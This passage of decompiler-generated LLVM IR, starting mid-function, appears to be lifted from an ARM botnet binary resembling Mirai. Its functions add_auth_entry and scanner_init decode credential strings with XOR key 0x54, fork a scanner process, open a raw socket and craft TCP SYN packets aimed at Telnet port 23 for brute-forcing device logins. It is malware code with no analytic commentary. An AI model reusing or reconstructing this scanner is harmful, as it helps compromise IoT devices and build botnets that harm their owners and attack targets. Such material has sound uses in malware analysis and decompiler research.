  %v3_e8a4 = inttoptr i32 %v2_e8a4 to i32*
  store i32 %v0_e8a4, i32* %v3_e8a4, align 4
  store i32 356, i32* @r1, align 4
  %v0_e8ac = call i32 @util_zero()
  store i32 %v0_e8ac, i32* %r0.global-to-local, align 4
  %v0_e8b0 = load i32, i32* @r5, align 4
  %v1_e8b0 = add i32 %v0_e8b0, 4
  %v2_e8b0 = inttoptr i32 %v1_e8b0 to i32*
  %v3_e8b0 = load i32, i32* %v2_e8b0, align 4
  store i32 %v3_e8b0, i32* @r4, align 4
  %v0_e8b4 = load i32, i32* @r6, align 4
  store i32 %v0_e8b4, i32* @r2, align 4
  store i32 %v3_e8b0, i32* %r0.global-to-local, align 4
  %v2_e8c0 = call i32 @__libc_fcntl(i32 %v3_e8b0, i32 3)
  %v1_e8c8 = or i32 %v2_e8c0, 2048
  store i32 %v1_e8c8, i32* @r2, align 4
  %v0_e8cc = load i32, i32* @r4, align 4
  store i32 %v0_e8cc, i32* %r0.global-to-local, align 4
  %v2_e8d0 = call i32 @__libc_fcntl(i32 %v0_e8cc, i32 4)
  store i32 %v2_e8d0, i32* %r0.global-to-local, align 4
  %v2_e8d8 = load i32, i32* @global_var_21f84.142, align 4
  store i32 %v2_e8d8, i32* %r2.global-to-local, align 4
  %v1_e8e0 = load i32, i32* @r5, align 4
  %v2_e8e0 = add i32 %v1_e8e0, 12
  %v3_e8e0 = inttoptr i32 %v2_e8e0 to i32*
  store i32 1, i32* %v3_e8e0, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e8ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e8ec = load i32, i32* @r5, align 4
  %v2_e8ec = add i32 %v1_e8ec, 8
  %v3_e8ec = inttoptr i32 %v2_e8ec to i32*
  store i32 %v0_e8ec, i32* %v3_e8ec, align 4
  %v0_e8f0 = load i32, i32* @r5, align 4
  %v1_e8f4 = add i32 %v0_e8f0, 4
  %v2_e8f4 = inttoptr i32 %v1_e8f4 to i32*
  %v3_e8f4 = load i32, i32* %v2_e8f4, align 4
  store i32 %v3_e8f4, i32* %r0.global-to-local, align 4
  %v1_e8f8 = add i32 %v0_e8f0, 20
  %v2_e8f8 = inttoptr i32 %v1_e8f8 to i16*
  %v3_e8f8 = load i16, i16* %v2_e8f8, align 2
  %v4_e8f8 = zext i16 %v3_e8f8 to i32
  store i32 %v4_e8f8, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e90c = call i32 @__libc_connect(i32 %v3_e8f4, i32 %v2_e864, i32 16)
  store i32 %v3_e90c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %entry.dec_label_pc_e910_crit_edge, %dec_label_pc_e8a0
  %v1_e918 = phi i32 [ %v1_e918.pre, %entry.dec_label_pc_e910_crit_edge ], [ %v3_e90c, %dec_label_pc_e8a0 ]
  %v2_e914 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e914, i32* @r4, align 4
  store i32 %v6_e858, i32* @r5, align 4
  store i32 %v9_e858, i32* @r6, align 4
  store i32 %v12_e858, i32* @lr, align 4
  ret i32 %v1_e918

; uselistorder directives
  uselistorder i32 %v3_e890, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e910, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e920 = load i32, i32* @r4, align 4
  %v6_e920 = load i32, i32* @r5, align 4
  %v9_e920 = load i32, i32* @r6, align 4
  %v12_e920 = load i32, i32* @r7, align 4
  %v15_e920 = load i32, i32* @r8, align 4
  %v18_e920 = load i32, i32* @sb, align 4
  %v21_e920 = load i32, i32* @sl, align 4
  %v24_e920 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_21f50.144 to i32), i32* @fp, align 4
  %v2_e928 = load i32, i32* @global_var_21f50.144, align 4
  store i32 ptrtoint (i32* @global_var_21f7c.146 to i32), i32* @sl, align 4
  %v1_e934 = add i32 %v2_e928, 1
  store i32 %v1_e934, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e940 = load i32, i32* @global_var_21f7c.146, align 4
  store i32 %v2_e940, i32* %r0.global-to-local, align 4
  %v3_e944 = mul i32 %v1_e934, 16
  store i32 %v3_e944, i32* %r1.global-to-local, align 4
  %v4_e94c = inttoptr i32 %v2_e940 to i32*
  %v5_e94c = call i32 @realloc(i32* %v4_e94c, i32 %v3_e944, i32 %arg3, i32 %v1_e934)
  %v2_e950 = load i32, i32* @global_var_21f50.144, align 4
  store i32 %v2_e950, i32* %r2.global-to-local, align 4
  store i32 %v5_e94c, i32* @r8, align 4
  %v0_e958 = load i32, i32* @r5, align 4
  store i32 %v0_e958, i32* %r0.global-to-local, align 4
  %v1_e960 = load i32, i32* @sl, align 4
  %v2_e960 = inttoptr i32 %v1_e960 to i32*
  store i32 %v5_e94c, i32* %v2_e960, align 4
  %v1_e964 = inttoptr i32 %v0_e958 to i8*
  %v2_e964 = call i32 @util_strlen(i8* %v1_e964)
  %sext = mul i32 %v2_e964, 16777216
  %v1_e968 = sdiv i32 %sext, 16777216
  %v2_e968 = add nsw i32 %v1_e968, 1
  store i32 %v2_e968, i32* @r4, align 4
  store i32 %v1_e968, i32* @r7, align 4
  store i32 %v2_e968, i32* @r0, align 4
  %v0_e974 = call i32 @malloc()
  store i32 %v0_e974, i32* %r0.global-to-local, align 4
  %v0_e978 = load i32, i32* @r5, align 4
  store i32 %v0_e978, i32* %r1.global-to-local, align 4
  %v0_e97c = load i32, i32* @r4, align 4
  store i32 %v0_e97c, i32* %r2.global-to-local, align 4
  store i32 %v0_e974, i32* %r6.global-to-local, align 4
  %v3_e984 = call i32 @util_memcpy(i32 %v0_e974, i32 %v0_e978, i32 %v0_e97c)
  store i32 %v3_e984, i32* %r0.global-to-local, align 4
  %v0_e988 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e988, 1
  %extract.t6 = trunc i32 %v0_e988 to i8
  br i1 %tmp22, label %dec_label_pc_e9ac, label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e994, %dec_label_pc_e990
  %v2_e99c = phi i32 [ %v1_e9a0, %dec_label_pc_e994 ], [ 0, %dec_label_pc_e990 ]
  %v1_e994 = load i32, i32* %r6.global-to-local, align 4
  %v2_e994 = add i32 %v1_e994, %v2_e99c
  %v3_e994 = inttoptr i32 %v2_e994 to i8*
  %v4_e994 = load i8, i8* %v3_e994, align 1
  %v6_e994 = zext i8 %v4_e994 to i32
  %v1_e998 = xor i32 %v6_e994, 84
  store i32 %v1_e998, i32* %r3.global-to-local, align 4
  %v1_e99c = trunc i32 %v1_e998 to i8
  store i8 %v1_e99c, i8* %v3_e994, align 1
  %v0_e9a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e9a0 = add i32 %v0_e9a0, 1
  store i32 %v1_e9a0, i32* %r2.global-to-local, align 4
  %v1_e9a4 = load i32, i32* @r7, align 4
  %v9_e9a4 = icmp eq i32 %v1_e9a0, %v1_e9a4
  br i1 %v9_e9a4, label %dec_label_pc_e9ac.loopexit, label %dec_label_pc_e994

dec_label_pc_e9ac.loopexit:                       ; preds = %dec_label_pc_e994
  %extract.t = trunc i32 %v1_e9a0 to i8
  br label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e9ac.loopexit, %entry
  %v0_e9bc.off0 = phi i8 [ %extract.t, %dec_label_pc_e9ac.loopexit ], [ %extract.t6, %entry ]
  %v2_e9ac = load i32, i32* @global_var_21f50.144, align 4
  %v2_e9b0 = load i32, i32* @global_var_21f7c.146, align 4
  %v3_e9b4 = mul i32 %v2_e9ac, 16
  store i32 %v3_e9b4, i32* @sb, align 4
  %v2_e9b8 = add i32 %v2_e9b0, %v3_e9b4
  store i32 %v2_e9b8, i32* %r2.global-to-local, align 4
  %v3_e9bc = add i32 %v2_e9b8, 12
  %v4_e9bc = inttoptr i32 %v3_e9bc to i8*
  store i8 %v0_e9bc.off0, i8* %v4_e9bc, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e950, i32* %r3.global-to-local, align 4
  %v0_e9c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_e9c8 = load i32, i32* @r8, align 4
  %v5_e9c8 = mul i32 %v2_e950, 16
  %v6_e9c8 = add i32 %v1_e9c8, %v5_e9c8
  %v7_e9c8 = inttoptr i32 %v6_e9c8 to i32*
  store i32 %v0_e9c8, i32* %v7_e9c8, align 4
  %v2_e9cc = load i32, i32* @global_var_21f7c.146, align 4
  store i32 %v2_e9cc, i32* @r7, align 4
  %v1_e9d0 = inttoptr i32 %arg2 to i8*
  %v2_e9d0 = call i32 @util_strlen(i8* %v1_e9d0)
  %sext1 = mul i32 %v2_e9d0, 16777216
  %v1_e9d4 = sdiv i32 %sext1, 16777216
  %v2_e9d4 = add nsw i32 %v1_e9d4, 1
  store i32 %v2_e9d4, i32* @r4, align 4
  store i32 %v1_e9d4, i32* @r6, align 4
  store i32 %v2_e9d4, i32* @r0, align 4
  %v0_e9e0 = call i32 @malloc()
  store i32 %v0_e9e0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e9e8 = load i32, i32* @r4, align 4
  store i32 %v0_e9e8, i32* %r2.global-to-local, align 4
  store i32 %v0_e9e0, i32* %r5.global-to-local, align 4
  %v3_e9f0 = call i32 @util_memcpy(i32 %v0_e9e0, i32 %arg2, i32 %v0_e9e8)
  store i32 %v3_e9f0, i32* %r0.global-to-local, align 4
  %v0_e9f4 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e9f4, 1
  %extract.t8 = trunc i32 %v0_e9f4 to i8
  br i1 %tmp23, label %dec_label_pc_ea18, label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9ac
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_ea00, %dec_label_pc_e9fc
  %v2_ea08 = phi i32 [ %v1_ea0c, %dec_label_pc_ea00 ], [ 0, %dec_label_pc_e9fc ]
  %v1_ea00 = load i32, i32* %r5.global-to-local, align 4
  %v2_ea00 = add i32 %v1_ea00, %v2_ea08
  %v3_ea00 = inttoptr i32 %v2_ea00 to i8*
  %v4_ea00 = load i8, i8* %v3_ea00, align 1
  %v6_ea00 = zext i8 %v4_ea00 to i32
  %v1_ea04 = xor i32 %v6_ea00, 84
  store i32 %v1_ea04, i32* %r3.global-to-local, align 4
  %v1_ea08 = trunc i32 %v1_ea04 to i8
  store i8 %v1_ea08, i8* %v3_ea00, align 1
  %v0_ea0c = load i32, i32* %r2.global-to-local, align 4
  %v1_ea0c = add i32 %v0_ea0c, 1
  store i32 %v1_ea0c, i32* %r2.global-to-local, align 4
  %v1_ea10 = load i32, i32* @r6, align 4
  %v9_ea10 = icmp eq i32 %v1_ea0c, %v1_ea10
  br i1 %v9_ea10, label %dec_label_pc_ea18.loopexit, label %dec_label_pc_ea00

dec_label_pc_ea18.loopexit:                       ; preds = %dec_label_pc_ea00
  %extract.t7 = trunc i32 %v1_ea0c to i8
  br label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %dec_label_pc_ea18.loopexit, %dec_label_pc_e9ac
  %v0_ea28.off0 = phi i8 [ %extract.t7, %dec_label_pc_ea18.loopexit ], [ %extract.t8, %dec_label_pc_e9ac ]
  %v2_ea18 = load i32, i32* @global_var_21f50.144, align 4
  store i32 %v2_ea18, i32* %r0.global-to-local, align 4
  %v2_ea1c = load i32, i32* @global_var_21f7c.146, align 4
  %v3_ea20 = mul i32 %v2_ea18, 16
  store i32 %v3_ea20, i32* %r1.global-to-local, align 4
  %v2_ea24 = or i32 %v3_ea20, 13
  %v3_ea28 = add i32 %v2_ea24, %v2_ea1c
  %v4_ea28 = inttoptr i32 %v3_ea28 to i8*
  store i8 %v0_ea28.off0, i8* %v4_ea28, align 1
  store i32 ptrtoint (i16** @global_var_21f80.148 to i32), i32* %r4.global-to-local, align 4
  %v2_ea34 = load i16, i16* bitcast (i16** @global_var_21f80.148 to i16*), align 4
  %v3_ea34 = zext i16 %v2_ea34 to i32
  store i32 %v3_ea34, i32* %lr.global-to-local, align 4
  %v2_ea3c = load i32, i32* @global_var_21f7c.146, align 4
  store i32 %v2_ea3c, i32* %r2.global-to-local, align 4
  %v0_ea44 = load i32, i32* %r1.global-to-local, align 4
  %v2_ea44 = add i32 %v0_ea44, %v2_ea3c
  store i32 %v2_ea44, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21f80.148 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ea4c = load i32, i32* @sb, align 4
  %v1_ea4c = load i32, i32* @r7, align 4
  %v2_ea4c = add i32 %v1_ea4c, %v0_ea4c
  store i32 %v2_ea4c, i32* %ip.global-to-local, align 4
  %v0_ea50 = load i32, i32* %r0.global-to-local, align 4
  %v1_ea50 = add i32 %v0_ea50, 1
  store i32 %v1_ea50, i32* %r0.global-to-local, align 4
  %v3_ea54 = add i32 %v2_ea44, 10
  %v4_ea54 = inttoptr i32 %v3_ea54 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21f80.148 to i32), i32 16), i32 16) to i16), i16* %v4_ea54, align 2
  %v0_ea58 = load i32, i32* %lr.global-to-local, align 4
  %v1_ea58 = trunc i32 %v0_ea58 to i16
  %v2_ea58 = load i32, i32* %r1.global-to-local, align 4
  %v3_ea58 = add i32 %v2_ea58, 8
  %v4_ea58 = inttoptr i32 %v3_ea58 to i16*
  store i16 %v1_ea58, i16* %v4_ea58, align 2
  %v0_ea5c = load i32, i32* %r5.global-to-local, align 4
  %v1_ea5c = load i32, i32* %ip.global-to-local, align 4
  %v2_ea5c = add i32 %v1_ea5c, 4
  %v3_ea5c = inttoptr i32 %v2_ea5c to i32*
  store i32 %v0_ea5c, i32* %v3_ea5c, align 4
  %v1_ea60 = load i32, i32* @fp, align 4
  %v2_ea60 = inttoptr i32 %v1_ea60 to i32*
  store i32 %v1_ea50, i32* %v2_ea60, align 4
  %v0_ea64 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea64 = trunc i32 %v0_ea64 to i16
  %v2_ea64 = load i32, i32* %r4.global-to-local, align 4
  %v3_ea64 = inttoptr i32 %v2_ea64 to i16*
  store i16 %v1_ea64, i16* %v3_ea64, align 2
  store i32 %v3_e920, i32* @r4, align 4
  store i32 %v6_e920, i32* @r5, align 4
  store i32 %v9_e920, i32* @r6, align 4
  store i32 %v12_e920, i32* @r7, align 4
  store i32 %v15_e920, i32* @r8, align 4
  store i32 %v18_e920, i32* @sb, align 4
  store i32 %v21_e920, i32* @sl, align 4
  store i32 %v24_e920, i32* @fp, align 4
  ret i32 %v1_ea50

; uselistorder directives
  uselistorder i32 %v3_ea20, { 1, 0 }
  uselistorder i32 %v1_ea0c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e9e0, { 1, 0, 2 }
  uselistorder i32 %v3_e9b4, { 1, 0 }
  uselistorder i32 %v1_e9a0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e974, { 1, 0, 2 }
  uselistorder i32 %v2_e950, { 1, 0, 2 }
  uselistorder i32 %v3_e944, { 1, 0 }
  uselistorder i32 %v1_e934, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ea80 = load i32, i32* @r5, align 4
  %v18_ea80 = load i32, i32* @sb, align 4
  %v21_ea80 = load i32, i32* @sl, align 4
  %v24_ea80 = load i32, i32* @fp, align 4
  %v0_ea8c = call i32 @__libc_fork()
  %v7_ea90 = icmp eq i32 %v0_ea8c, -1
  %. = zext i1 %v7_ea90 to i32
  %tmp369 = icmp slt i32 %v0_ea8c, 1
  %storemerge328 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge328, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24a70.140 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eaac = icmp eq i32 %storemerge328, 0
  store i1 %v2_eaac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ea8c, i32* @global_var_24a70.140, align 4
  br i1 %v2_eaac, label %dec_label_pc_eac8, label %dec_label_pc_eab8

dec_label_pc_eab8:                                ; preds = %entry
  store i32 %v6_ea80, i32* @r5, align 4
  store i32 %v18_ea80, i32* @sb, align 4
  store i32 %v21_ea80, i32* @sl, align 4
  store i32 %v24_ea80, i32* @fp, align 4
  ret i32 %v0_ea8c

dec_label_pc_eac8:                                ; preds = %entry
  %v0_eac8 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_eac8, i32* @global_var_24a4c.59, align 4
  %v1_ead4 = call i32 @rand_init(i32 %v0_eac8)
  %v0_ead8 = load i32, i32* @r4, align 4
  %v1_eadc = inttoptr i32 %v0_ead8 to i32*
  %v2_eadc = call i32 @__GI_time(i32* %v1_eadc)
  store i32 ptrtoint (i32* @global_var_21f84.142 to i32), i32* %r2.global-to-local, align 4
  store i32 388, i32* %r1.global-to-local, align 4
  store i32 %v2_eadc, i32* @global_var_21f84.142, align 4
  %v2_eaf0 = call i32 @calloc(i32 356, i32 388)
  store i32 ptrtoint (i32* @global_var_24a68.153 to i32), i32* %r3.global-to-local, align 4
  %v0_eaf8 = load i32, i32* @r4, align 4
  store i32 %v0_eaf8, i32* %stack_var_-52, align 4
  store i32 %v2_eaf0, i32* @global_var_24a68.153, align 4
  store i32 %v0_eaf8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_eb04

dec_label_pc_eb04:                                ; preds = %dec_label_pc_eb04.dec_label_pc_eb04_crit_edge, %dec_label_pc_eac8
  %v2_eb20 = phi i32 [ %v2_eb20.pre, %dec_label_pc_eb04.dec_label_pc_eb04_crit_edge ], [ %v2_eaf0, %dec_label_pc_eac8 ]
  %v0_eb08 = phi i32 [ %v0_eb50, %dec_label_pc_eb04.dec_label_pc_eb04_crit_edge ], [ %v0_eaf8, %dec_label_pc_eac8 ]
  %v1_eb28 = add i32 %v0_eb08, 1
  store i32 %v1_eb28, i32* %ip.global-to-local, align 4
  %v3_eb2c = mul i32 %v0_eb08, 388
  %v2_eb34 = add i32 %v3_eb2c, %v2_eb20
  store i32 %v2_eb34, i32* @r3, align 4
  store i32 %v2_eb34, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_eb48 = add i32 %v2_eb34, 4
  %v3_eb48 = inttoptr i32 %v2_eb48 to i32*
  store i32 -1, i32* %v3_eb48, align 4
  %v0_eb4c = load i32, i32* @r5, align 4
  %v1_eb4c = load i32, i32* %r1.global-to-local, align 4
  %v2_eb4c = add i32 %v1_eb4c, 12
  %v3_eb4c = inttoptr i32 %v2_eb4c to i32*
  store i32 %v0_eb4c, i32* %v3_eb4c, align 4
  %v0_eb50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_eb50, i32* %stack_var_-52, align 4
  %v5_eb54 = icmp slt i32 %v1_eb28, 356
  br i1 %v5_eb54, label %dec_label_pc_eb04.dec_label_pc_eb04_crit_edge, label %dec_label_pc_eb58

dec_label_pc_eb04.dec_label_pc_eb04_crit_edge:    ; preds = %dec_label_pc_eb04
  %v2_eb20.pre = load i32, i32* @global_var_24a68.153, align 4
  br label %dec_label_pc_eb04

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb04
  %v8_eb44 = icmp eq i32 %v1_eb28, 356
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_eb44, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_eb60 = load i32, i32* %r2.global-to-local, align 4
  %v1_eb60 = add i32 %v0_eb60, 7
  store i32 %v1_eb60, i32* %r2.global-to-local, align 4
  %v3_eb64 = call i32 @socket(i32 2, i32 3, i32 %v1_eb60)
  store i32 ptrtoint (i32* @global_var_24a6c.155 to i32), i32* @lr, align 4
  %v2_eb6c = icmp eq i32 %v3_eb64, -1
  store i1 %v2_eb6c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb6c = icmp eq i32 %v3_eb64, -1
  store i1 %v7_eb6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_eb64, i32* @r4, align 4
  store i32 %v3_eb64, i32* @global_var_24a6c.155, align 4
  br i1 %v7_eb6c, label %dec_label_pc_10178, label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb58
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_eb80 = load i32, i32* @r5, align 4
  store i32 %v0_eb80, i32* @r2, align 4
  %v2_eb84 = call i32 @__libc_fcntl(i32 %v3_eb64, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_eb8c = or i32 %v2_eb84, 2048
  store i32 %v1_eb8c, i32* @r2, align 4
  %v0_eb90 = load i32, i32* @r4, align 4
  %v2_eb94 = call i32 @__libc_fcntl(i32 %v0_eb90, i32 4)
  %v2_eb9c = ptrtoint i32* %stack_var_-56 to i32
  %v2_eba0 = load i32, i32* @global_var_24a6c.155, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_eba8 = load i32, i32* @r5, align 4
  store i32 %v0_eba8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ebb0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ebb0, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ebc0 = call i32 @__GI_setsockopt(i32 %v2_eba0, i32 %v0_eba8, i32 3, i32 %v2_ebb0, i32 4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebc4 = icmp eq i32 %v5_ebc0, 0
  store i1 %v2_ebc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebc4, label %dec_label_pc_ebcc, label %dec_label_pc_1016c

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eb7c, %dec_label_pc_ebcc
  %v0_ebcc = call i32 @rand_next()
  %v1_ebdc = mul i32 %v0_ebcc, 256
  %v3_ebe0 = and i32 %v1_ebdc, 65280
  %tmp372 = udiv i32 %v0_ebcc, 256
  %v4_ebe4 = urem i32 %tmp372, 256
  %v5_ebe4 = or i32 %v4_ebe4, %v3_ebe0
  store i32 %v5_ebe4, i32* %r3.global-to-local, align 4
  %v2_ebe8 = icmp ugt i32 %v5_ebe4, 1023
  store i1 %v2_ebe8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe8 = icmp eq i32 %v5_ebe4, 1024
  store i1 %v7_ebe8, i1* %cpsr_z.global-to-local, align 1
  %v3_ebec = icmp ult i32 %v5_ebe4, 1022
  br i1 %v3_ebec, label %dec_label_pc_ebcc, label %dec_label_pc_ebf0

dec_label_pc_ebf0:                                ; preds = %dec_label_pc_ebcc
  %v5_ebd8.le = trunc i32 %v0_ebcc to i16
  store i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32* %ip.global-to-local, align 4
  %v2_ebf4 = load i8, i8* bitcast (i8** @global_var_21f54.157 to i8*), align 4
  %v3_ebf4 = zext i8 %v2_ebf4 to i32
  %v1_ebf8 = and i32 %v3_ebf4, 240
  %v1_ebfc = or i32 %v1_ebf8, 5
  store i32 %v1_ebfc, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_21f54.157 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_21f56.158 to i16*), align 4
  %v0_ec1c = call i32 @rand_next()
  %v1_ec1c = trunc i32 %v0_ec1c to i16
  %v3_ec24 = load i8, i8* @global_var_21f74.161, align 1
  store i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32* %ip.global-to-local, align 4
  %v1_ec34 = urem i8 %v3_ec24, 16
  store i16 %v1_ec1c, i16* bitcast (i32* @global_var_21f58.162 to i16*), align 4
  %v1_ec3c = or i8 %v1_ec34, 80
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_21f5c.163 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_21f5d.164 to i8*), align 4
  store i8 %v1_ec3c, i8* @global_var_21f74.161, align 1
  %v4_ec54 = sext i16 %v5_ebd8.le to i32
  store i32 %v4_ec54, i32* %r2.global-to-local, align 4
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* @global_var_21f6a.165, align 2
  store i16 %v5_ebd8.le, i16* bitcast (i32* @global_var_21f68.160 to i16*), align 4
  %v0_ec64 = call i32 @rand_next()
  %v1_ec64 = trunc i32 %v0_ec64 to i16
  store i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32* %ip.global-to-local, align 4
  %v3_ec6c = load i8, i8* @global_var_21f75.166, align 1
  %v4_ec6c = zext i8 %v3_ec6c to i32
  %v1_ec70 = or i32 %v4_ec6c, 2
  store i32 %v1_ec70, i32* %r3.global-to-local, align 4
  store i16 %v1_ec64, i16* bitcast (i32* @global_var_21f76.167 to i16*), align 4
  %v1_ec78 = trunc i32 %v1_ec70 to i8
  store i8 %v1_ec78, i8* @global_var_21f75.166, align 1
  store i32 ptrtoint (i32* @global_var_1962c.171 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ec88 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint (i32* @global_var_1962c.171 to i32), i32 7)
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19610.173 to i32), i32* %r1.global-to-local, align 4
  %v5_ec98 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19610.173 to i32), i32 ptrtoint ([6 x i8]* @global_var_19610.173 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_19618.175 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_eca8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint (i32* @global_var_19618.175 to i32), i32 15)
  store i32 ptrtoint (i32* @global_var_19624.177 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ecb8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint (i32* @global_var_19624.177 to i32), i32 15)
  store i32 ptrtoint (i32* @global_var_19630.179 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_ecc8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19608.169 to i32), i32 ptrtoint (i32* @global_var_19630.179 to i32), i32 14)
  store i32 ptrtoint ([7 x i8]* @global_var_19638.181 to i32), i32* %r1.global-to-local, align 4
